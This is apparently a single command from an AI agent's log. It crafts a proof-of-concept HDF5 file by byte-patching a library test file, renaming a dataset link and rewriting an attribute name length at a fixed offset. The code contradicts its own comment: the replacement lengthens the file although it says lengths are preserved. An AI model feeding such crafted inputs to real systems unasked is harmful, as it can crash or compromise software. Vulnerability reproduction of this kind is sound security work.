Command `cd /workspace && cp repo-vul/src-vul/hdf5/test/bad_compound.h5 /workspace/poc1.h5 && python3 - <<'PY'
from pathlib import Path
p=Path('/workspace/poc1.h5')
b=bytearray(p.read_bytes())
# Rename root dataset link and compact attribute name in the object header, preserving lengths/alignment.
b=b.replace(b'dataset\x00', b'dsetname\x00', 1)
# Attribute message at bad_compound.h5 offset 0x870 has old v1 name_len=5, aligned to 8 bytes; set name_len=8 and name bytes to theattr\0.
o=0x870
assert b[o:o+8] == bytes([1,0,5,0,8,0,16,0]), b[o:o+8]
b[o+2:o+4]=(8).to_bytes(2,'little')
b[o+8:o+16]=b'theattr\x00'
p.write_bytes(b)
PY
